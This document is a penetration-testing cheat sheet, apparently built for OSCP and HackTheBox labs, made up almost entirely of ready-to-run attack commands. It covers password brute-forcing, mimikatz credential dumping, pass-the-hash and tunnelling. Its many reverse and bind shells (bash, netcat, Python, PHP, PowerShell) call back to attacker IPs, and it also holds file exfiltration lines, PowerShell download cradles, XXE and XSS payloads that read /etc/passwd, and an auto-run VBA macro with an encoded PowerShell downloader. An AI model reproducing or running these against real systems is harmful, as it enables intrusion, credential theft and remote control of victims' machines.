# Discovery

### General

```shell
./lazyrecon.sh -d indeed.com


./dirsearch.py -u https://thehub.buzzfeed.com/ -e php,asp,txt -t 40
```

### NMAP

```bash
nmap -sC -sV -oA name <ip>
#NMAP SCRIPTS
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/SecLists/Usernames/top_shortlist.txt x.x.x.x
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IP


masscan -sS --ports 0-65535 10.10.10.209 -e utun2
```

# Passwords

## Brute-Force

### Crowbar - rdp

```bash
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```



### Hydra - ssh

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
hydra -L user.txt -P passwords.txt ssh://127.0.0.1
```



### Hydra - POST

```bash
hydra 10.11.0.22 http-form-post "/form/login.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```



Ncrack -RDP

```bash
ncrack -vv --user svclient08 -P /usr/share/wordlist rdp://10.11.1.24
```



### Medusa

```bash
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```



## mimikatz.exe

```
C:\> C:\temp\mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```



## Cracking

### Hash identification

```bash
hashid 'HASH_HERE'
john hash.txt --format=NT
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT

unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

python ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash
```



### PassTheHash

```bash
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd
```



# Tunneling

### Port Forwarding - Rinetd

```bash
nano /etc/rinetd.conf
# bindadress bindport connectaddress connectport
0.0.0.0 80 10.11.1.50 80
# every traffic on 0.0.0.0:80 will be redirected to 10.11.1.50:80
sudo service rinetd restart
```



### Local Port Forward

```bash
$ ssh -N -L [local_listen_port]:[target_ip]:[target_port] [username@address]
$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
#Any traffic on our KAli on port=445 -> will be forwarded to 192.168.1.110 on port=445 across SSH Tunnel on 10.11.0.128
$ smbclient -L 127.0.0.1 -U Administrator
#smbclient will connect to 192.168.1.110 by tunnel
```

### Remote Port Forward

```bash
$ ssh -N -R [bind_address:]port:host:hostport [username@address]
$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
#Any traffic on 10.11.0.4:2221 will be forwarded to 127.0.0.1:3306 (ssh client) over SSH Tunnel
```

### Dynamic Port Forward

```bash
$ ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
$ cat /etc/proxychains.conf 
socks4 127.0.0.1 8080
$ proxychains <Command Targetting what 10.11.0.128 caan see>
```

### Plink

```bash
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```

### Nitch

```bash
$ netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
$ netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
```

### Others

```
sshuttle -r root@<target_ip> 10.2.2.0/24
```

```
plink -R 2020:localhost:2020 root@10.10.16.31 -pw "toor"
```

```
dbclient -i .k -f -N -R 8888:172.19.0.4:80 dummy@10.10.14.14
```

### Without SSH

* #### portfwd

```
meterpreter > portfwd add -l 80 -r 172.19.0.4 -p 80
```

* #### Autoroute

```
msf post(multi/manage/autoroute)
```



# Web Listeners

```
php -S 0.0.0.0:8000
python3 -m http.server 7331
python -m SimpleHTTPServer 7331
ruby -run -e httpd . -p 9000
busybox httpd -f -p 10000
```



# Shell

### Bash

```shell
#!/bin/bash
/bin/bash -c "bash &>/dev/tcp/10.10.16.104/4444 <&1"

/bin/sh -i >& /dev/tcp/10.10.16.104/4444 0>&1
```



### nc

```shell
/bin/nc -e /bin/sh 10.10.16.104 4444
ncat 10.10.14.41 3344 -e /bin/bash
/bin/nc 10.10.16.104 4444 < /root/root.txt
rm /tmp/fo;mkfifo /tmp/fo;cat /tmp/fo|/bin/sh -i 2>&1|nc 10.10.16.104 443 >/tmp/fo
```



### Socat

##### Revers_shell

```
socat -d -d TCP4-LISTEN:443 STDOUT
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

##### File_transfer

```bash
socat TCP4-LISTEN:443,fork file:secret_passwords.txt
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

##### Bind_shell_encrypted

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36 2 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin /bash
socat - OPENSSL:10.11.0.4:443,verify=0
```



### PowerCat

##### Instal

```
. .\powercat.ps1
```

##### File_transfer

```
sudo nc -lnvp 443 > receiving_powercat.ps1
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

##### Reverse_shell

```
sudo nc -lvp 443
powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

##### Bind_shell

```
powercat -l -p 443 -e cmd.exe
nc 10.11.0.22 443
```

##### Stand_alone

```
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell. ps1
powershell.exe -E <encoded>
```



### php

```php
GIF89a
<?php echo system($_GET); ?>
<?php exec("nc 192.168.119.122 80 -e cmd.exe")?>
  
/bin/php -r '$sock=fsockopen("10.10.16.104",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash

```



### java

```java
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```



### python

```python
python -c 'import pty; pty.spawn("/bin/bash")'


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.104",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



### find

```shell
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
```



### MSF

```
use exploit/windows/misc/hta_server
mshta.exe http://10.211.55.5:80/Q1laPNj1.hta
```



# Web

### Dir-search

```
dirsearch -u URL -e php -x 403
```



### XXE

```
<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.109:8000/"> ]> 
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```



### SSRF XSS

```html
<script>function naser(){x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();}</script>

<iframe id="myFrame" src="file:///../../index.php"></iframe>

<iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”>
  
<script>
x=new XMLHttpRequest;x.onload=function({document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>script>
```



### SQLMAP

```shell
sqlmap -r exp.txt -p productName --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows 

sqlmap -r req.txt -p productId --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows --file-read=C:\\inetpub\\wwwroot\\index.php

sqlmap -r req.txt -p productId --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows --file-write=/root/Desktop/scripts/powny_shell.php --file-dest=C:\\inetpub\\wwwroot
```



### Subdomain

```
subjack -w ss.txt -t 100 -timeout 30 -o results.txt -ssl -v
python takeover.py -d domain.com -w wordlist.txt -t 20
```



### code auditing

```
./scripts/cobra.py -t <code_folder>
```



# Windows

### Generic

```
enum4linux -a IP

Get-Service
netstat -aon | find /i "listening"

(new-object System.Net.WebClient).DownloadFile('http://10.10.16.104:8000/accesschk64.exe','./ack.exe')


net user pwn
runas /user:pwn\Administrator cmd.exe
```



### powershell

```powershell
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.119.122:8000/mimikatz.exe','mimikatz.exe')

powershell.exe -nop -w hidden -e <BASE64-UTF-16>

$user = "pwn\"
$pass = "o" | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$pass
Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { cmd.exe "/c C:\inetpub\wwwroot\uploads\nc.exe -e powershell.exe 10.10.16.104 4444" } 

C:\Users\shaun\Documents\nc.exe 10.10.16.31 8080 -e powershell.exe


reverse_shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.122',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.6',3344);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"



bind_shell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString ($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto p()"
```



### AD

```
./kerbrute.py -user Administrator -dc-ip 10.10.10.175 -domain EGOTISTICALBANK -passwords /usr/share/wordlists/rockyou.txt -threads 10

./GetNPUsers.py -dc-ip 10.10.10.175 EGOTISTICALBANK/svc_loanmgr -no-pass -format john -outputfile naser.txt

john --wordlist=/usr/share/wordlists/rockyou.txt naser.txt 


Pass the hash
impacket-secretsdump EGOTISTICALBANK/svc_loanmgr@sauna.htb

metasploit psexec
```



### Winrm

ports:5985-5986

```
ruby evil-winrm.rb -i control.htb -u hector -p l3tm3!n
```



### NFC

port 111

```
nmap -sV -p 111 --script=rpcinfo <ip>  --script nfs*

```





### SMB

Port 139 and 445- SMB/Samba shares

Samba is a service that enables the user to share files with other machines

works the same as a command line FTP client, may browse files without even having credentials

```bash
smbmap -H 192.168.1.13 -R -u Nadine -p L1k3B1gBut7s@W0rk
nmblookup -A 10.10.10.151
nbtscan 10.10.10.185

mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share

smbclient -N -L 10.10.10.169
smbclient -N -L 10.10.10.175 -U EGOTISTICALBANK/administrator
smbclient \\\\<targetip>\\ShareName
smbclient \\\\<targetip>\\ShareName -U john

spray.sh -smb IP <users.txt> <passwords.txt> 0 0 <DOMAIN>

\# Check SMB vulnerabilities:
nmap --script=smb-check-vulns.nse <targetip> -p445

\# scan for vulnerabilities with nmap
nmap --script "vuln" <targetip> -p139,445

\# basic nmap scripts to enumerate shares and OS discovery
nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse

\# Connect using Username
root@kali:~# smbclient -L <targetip> -U username -p 445

\# enumarete with smb-shares, -a “do everything” option
enum4linux -a 192.168.1.120

\# learn the machine name and then enumerate with smbclient
nmblookup -A 192.168.1.102
smbclient -L <server_name> -I 192.168.1.105

\# rpcclient - Connect with a null-session (only works for older windows servers)
rpcclient -U james 10.10.10.52
rpcclient -U "" 192.168.1.105
(press enter if asks for a password)

rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumalsgroups domain
rpcclient $> lookupnames administrators
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> queryuser john
```



### SNMB

```
#SNMP-Check
snmp-check ip
snmp-check $IP
snmpcheck -t $IP -c public
snmpcheck -t ip.X -c public

#onesixtyone
onesixtyone -c names -i hosts

#SNMPWALK
snmpwalk -c public -v1 $IP

#SNMPENUM
perl snmpenum.pl $IP public windows.txt

#NMAP SCRIPTS
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/SecLists/Usernames/top_shortlist.txt x.x.x.x
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IP
```



### PrivEsc

```
searchsploit linux kernel 2.6 | grep 'Cent'
gcc -m32 -Wall -o exploit 9542.c -Wl,--hash-style=both


.\ack.exe "Administrator" -Kvuqw hklm\system\CurrentControlSet\services

.\achk.exe -kns HKLM\system\CurrentControlSet\services\3ware

reg query "HKLM\system\CurrentControlSet\services\3ware" /v "ImagePath"

.\ack.exe "Everyone" -kvuqsw HKLM\system\CurrentControlSet\services



```



### Macro

```
Sub AutoOpen()
    Shell
End Sub
Sub Document_Open()
    Shell
End Sub
Sub Shell()
		Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZ"
    Str = Str + "QByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA"
    Str = Str + "6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9A"
    Str = Str + "FsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGM"
    Str = Str + "AbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABvAD0Ab"
    Str = Str + "gBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwB"
    Str = Str + "sAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlA"
    Str = Str + "HQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGY"
    Str = Str + "AYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAc"
    Str = Str + "wAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAG8ALgBwAHIAbwB"
    Str = Str + "4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdA"
    Str = Str + "DoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHk"
    Str = Str + "AKAApADsAJABvAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4Ad"
    Str = Str + "ABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQB"
    Str = Str + "hAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByA"
    Str = Str + "GUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4"
    Str = Str + "AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAb"
    Str = Str + "ABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQB"
    Str = Str + "uAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuA"
    Str = Str + "DEAMQA5AC4AMQAyADIALwA5AHoAZwBMAFYAegBoAFQAVwBTADE"
    Str = Str + "AUABDAE0ALwAwAEYAZABCAG8AbABkAFkAJwApACkAOwBJAEUAW"
    Str = Str + "AAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgB"
    Str = Str + "XAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkA"
    Str = Str + "FMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4"
    Str = Str + "AMQA2ADgALgAxADEAOQAuADEAMgAyAC8AOQB6AGcATABWAHoAa"
    Str = Str + "ABUAFcAUwAxAFAAQwBNACcAKQApADsA"
    
    CreateObject("Wscript.Shell").Run Str

End Sub
```



# general

```
netstat -tulpn | grep LISTEN
ps -aux | grep root

ssh -L 8000:127.0.0.1:8000 alexa@10.10.10.163 -N
ssh -L 52846:127.0.0.1:4444 root@10.10.16.43 -N -f

curl -X POST -F username=admin -F password=admin http://localhost:52846 

$EXEC("ls -l")

sudo restic -r rest:http://10.10.15.203:8000/ backup /root/root.txt --password-file 'naser.txt'


FTP:
 wget -r ftp://anonymous:anonymous@servmon.htb/
```





# References 

[Sql Injection](http://pentestmonkey.net/category/cheat-sheet/sql-injection)

[Crack](https://crackstation.net/)

[CyberChef](https://gchq.github.io/CyberChef/)

